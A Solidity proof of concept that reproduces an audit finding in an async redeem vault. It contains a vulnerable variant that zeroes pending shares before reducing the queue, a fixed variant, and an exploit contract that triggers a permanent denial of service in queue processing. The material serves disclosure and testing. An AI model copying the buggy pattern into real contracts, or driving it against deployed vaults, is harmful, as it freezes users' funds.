// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Accountable finding 62969:
// "AccountableAsyncRedeemVault::fulfillCancelRedeemRequest can de-sync request
//  data causing permanent DOS for queue processing".
//
// Root cause (verbatim from the finding):
//   function fulfillCancelRedeemRequest(address controller) public onlyOperatorOrStrategy {
//       _fulfillCancelRedeemRequest(_requestIds[controller], controller);
//       _reduce(controller, _vaultStates[controller].pendingRedeemRequest);
//   }
// _fulfillCancelRedeemRequest() zeroes _vaultStates[controller].pendingRedeemRequest,
// so the very next line reads it back as 0 and calls _reduce(controller, 0).
// _reduce with 0 shares is a no-op: the withdrawal request STAYS in the queue
// (request.shares == 100) and totalQueuedShares is never decremented, while
// pendingRedeemRequest has been zeroed. Later processUpToShares() reaches the
// stale request and _fulfillRedeemRequest() reverts NoRedeemRequest() because
// pendingRedeemRequest == 0 -> permanent DoS of ALL queue processing.
//
// The vulnerable fulfillCancelRedeemRequest() body and the _fulfillRedeemRequest()
// guard are inlined verbatim from finding 62969. _reduce() is inlined verbatim
// from sibling finding 62971 (same codebase). _fulfillCancelRedeemRequest() and
// the FIFO process loop are faithfully reconstructed per the finding description.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math.mulDiv (floor division).
library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }
}

/// @dev Minimal ERC20 marker token: records the frozen-shares magnitude at the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Base redeem-queue vault: shared FIFO queue accounting. The only difference
// between the buggy and fixed variants is fulfillCancelRedeemRequest() below.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract RedeemQueueVaultBase {
    using Math for uint256;

    error NoQueueRequest();
    error InsufficientShares();
    error NoRedeemRequest();
    error InsufficientAmount();
    error RedeemRequestWasCancelled();
    error NoPendingRedeemRequest();
    error CancelRedeemRequestPending();
    error NotAuthorized();

    struct VaultState {
        uint256 pendingRedeemRequest;
        bool pendingCancelRedeemRequest;
        uint256 maxWithdraw;
    }

    struct WithdrawalRequest {
        uint256 shares;
        uint256 totalValue;
        uint256 sharePrice;
        address controller;
    }

    struct Queue {
        uint128 nextRequestID;
        uint128 lastRequestID;
        mapping(uint128 => WithdrawalRequest) requests;
    }

    uint256 internal constant _precision = 1e18;

    address public operator;
    uint256 public sharePrice = 1e18; // 1:1 share price for this scenario

    mapping(address => VaultState) internal _vaultStates;
    mapping(address => uint128) internal _requestIds;
    Queue internal _queue;
    uint256 public totalQueuedShares;

    constructor(address _operator) {
        operator = _operator;
        _queue.nextRequestID = 1;
    }

    modifier onlyOperatorOrStrategy() {
        if (msg.sender != operator) revert NotAuthorized();
        _;
    }

    modifier onlyAuth() {
        _;
    }

    // ── User places a redeem request: push onto the FIFO queue ──
    function requestRedeem(uint256 shares, address controller) public {
        VaultState storage state = _vaultStates[controller];
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) {
            requestId = ++_queue.lastRequestID;
            _requestIds[controller] = requestId;
            WithdrawalRequest storage request = _queue.requests[requestId];
            request.shares = shares;
            request.totalValue = shares.mulDiv(sharePrice, _precision);
            request.sharePrice = sharePrice;
            request.controller = controller;
        } else {
            WithdrawalRequest storage request = _queue.requests[requestId];
            request.shares += shares;
            request.totalValue += shares.mulDiv(sharePrice, _precision);
            request.sharePrice = request.totalValue.mulDiv(_precision, request.shares);
        }
        state.pendingRedeemRequest += shares;
        totalQueuedShares += shares;
    }

    // ── Async cancel: strategy returns false, so cancellation is NOT fulfilled
    //    instantly. It only marks the request as pending-cancel; shares are NOT
    //    reduced here (reduction happens in fulfillCancelRedeemRequest). ──
    function cancelRedeemRequest(uint256, /*requestId*/ address controller) public onlyAuth {
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoPendingRedeemRequest();
        if (state.pendingCancelRedeemRequest) revert CancelRedeemRequestPending();
        state.pendingCancelRedeemRequest = true;
        // strategy.onCancelRedeemRequest(...) returns false (async) -> not fulfilled now
    }

    // ── Finalise cancellation: zero the pending request (per finding description). ──
    function _fulfillCancelRedeemRequest(uint128, /*requestId*/ address controller) internal {
        VaultState storage state = _vaultStates[controller];
        state.pendingCancelRedeemRequest = false;
        state.pendingRedeemRequest = 0; // request state set to zero HERE
    }

    // ── _reduce(): inlined VERBATIM from sibling finding 62971 (same codebase). ──
    function _reduce(address controller, uint256 shares) internal returns (uint256 remainingShares) {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 currentShares = _queue.requests[requestId].shares;
        if (shares > currentShares || currentShares == 0) revert InsufficientShares();

        remainingShares = currentShares - shares;
        totalQueuedShares -= shares;

        if (remainingShares == 0) {
            _delete(controller, requestId);
        } else {
            _queue.requests[requestId].shares = remainingShares;
        }
    }

    function _delete(address controller, uint128 requestId) internal {
        delete _queue.requests[requestId];
        delete _requestIds[controller];
        // advance the FIFO head past a deleted request
        if (_queue.nextRequestID == requestId) {
            _queue.nextRequestID = requestId + 1;
        }
    }

    // ── _fulfillRedeemRequest(): guard inlined VERBATIM from finding 62969. ──
    function _fulfillRedeemRequest(uint128, /*requestId*/ address controller, uint256 shares, uint256 price)
        internal
    {
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();
        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();
        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();

        state.pendingRedeemRequest -= shares;
        state.maxWithdraw += shares.mulDiv(price, _precision);
        _reduce(controller, shares);
    }

    // ── Reconstructed FIFO batch processor. Walks nextRequestID..lastRequestID. ──
    function processUpToShares(uint256 maxShares) public {
        uint128 requestId = _queue.nextRequestID;
        uint256 processed = 0;
        while (requestId <= _queue.lastRequestID && processed < maxShares) {
            WithdrawalRequest storage request = _queue.requests[requestId];
            uint256 shares = request.shares;
            if (shares == 0) {
                requestId++;
                continue;
            }
            _fulfillRedeemRequest(requestId, request.controller, shares, request.sharePrice);
            processed += shares;
            requestId++;
        }
        _queue.nextRequestID = requestId;
    }

    // ── Variant-specific entry point ──
    function fulfillCancelRedeemRequest(address controller) public virtual;

    // ── Views for the driver / exploit to assert on ──
    function getRequestShares(address controller) external view returns (uint256) {
        return _queue.requests[_requestIds[controller]].shares;
    }

    function getPendingRedeem(address controller) external view returns (uint256) {
        return _vaultStates[controller].pendingRedeemRequest;
    }

    function getRequestId(address controller) external view returns (uint128) {
        return _requestIds[controller];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE variant: fulfillCancelRedeemRequest() body inlined VERBATIM from
// finding 62969. The @> line reads pendingRedeemRequest AFTER it was zeroed.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVault is RedeemQueueVaultBase {
    constructor(address _operator) RedeemQueueVaultBase(_operator) {}

    function fulfillCancelRedeemRequest(address controller) public override onlyOperatorOrStrategy {
        _fulfillCancelRedeemRequest(_requestIds[controller], controller);
        _reduce(controller, _vaultStates[controller].pendingRedeemRequest); // @> pendingRedeemRequest already zeroed -> _reduce(controller,0) no-ops, request left stale in queue
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED variant (recommended mitigation): cache pendingShares BEFORE
// _fulfillCancelRedeemRequest zeroes it, then pass the cached value to _reduce.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVaultFixed is RedeemQueueVaultBase {
    constructor(address _operator) RedeemQueueVaultBase(_operator) {}

    function fulfillCancelRedeemRequest(address controller) public override onlyOperatorOrStrategy {
        uint256 pendingShares = _vaultStates[controller].pendingRedeemRequest;
        _fulfillCancelRedeemRequest(_requestIds[controller], controller);
        _reduce(controller, pendingShares);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduces the permanent queue DoS end to end.
//   1. User queues 100 shares.
//   2. User cancels (async -> pending).
//   3. Operator calls the buggy fulfillCancelRedeemRequest -> _reduce(controller,0).
//   4. Assert the desync: request.shares still 100, pendingRedeemRequest 0,
//      totalQueuedShares still 100.
//   5. processUpToShares() reverts NoRedeemRequest permanently -> DoS.
//   6. Record the frozen-shares magnitude on a MARKER token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant REDEEM_SHARES = 100 ether; // 100 shares (18 decimals)

    // Exposed results.
    address public vaultAddr;
    address public markerAddr;
    uint256 public staleRequestShares;
    uint256 public pendingAfter;
    uint256 public totalQueuedAfter;
    bool public dosConfirmed;
    bool public dosStillFrozen;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // Exploit acts as the legitimate operator (onlyOperatorOrStrategy).
        AccountableAsyncRedeemVault vault = new AccountableAsyncRedeemVault(address(this)); // nonce 1
        MiniToken marker = new MiniToken("Locked Queue Shares", "LOCKED-shares");           // nonce 2 (LAST)
        vaultAddr = address(vault);
        markerAddr = address(marker);

        // 1. User X places a redeem request for 100 shares.
        vault.requestRedeem(REDEEM_SHARES, USER);
        uint128 reqId = vault.getRequestId(USER);

        // 2. User X cancels; strategy is async so the cancel is left pending.
        vault.cancelRedeemRequest(reqId, USER);

        // 3. Operator finalises the cancel via the BUGGY path -> _reduce(controller, 0).
        vault.fulfillCancelRedeemRequest(USER);

        // 4. The queue is now de-synced: the request survives with its full shares
        //    while pendingRedeemRequest was zeroed and totalQueuedShares untouched.
        staleRequestShares = vault.getRequestShares(USER);
        pendingAfter = vault.getPendingRedeem(USER);
        totalQueuedAfter = vault.totalQueuedShares();
        require(staleRequestShares == REDEEM_SHARES, "request should remain stale in queue");
        require(pendingAfter == 0, "pendingRedeemRequest should have been zeroed");
        require(totalQueuedAfter == REDEEM_SHARES, "totalQueuedShares should be de-synced");

        // 5. Batch processing now hits the stale request and reverts permanently.
        try vault.processUpToShares(type(uint256).max) {
            dosConfirmed = false;
        } catch {
            dosConfirmed = true;
        }
        require(dosConfirmed, "expected NoRedeemRequest revert (queue DoS)");

        // Permanent: a second attempt reverts identically -> all redemptions frozen.
        try vault.processUpToShares(type(uint256).max) {
            dosStillFrozen = false;
        } catch {
            dosStillFrozen = true;
        }
        require(dosStillFrozen, "queue processing should stay permanently frozen");

        // 6. Record the frozen-shares magnitude at the SINK (DoS harm; profit == 0).
        marker.mint(SINK, staleRequestShares);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
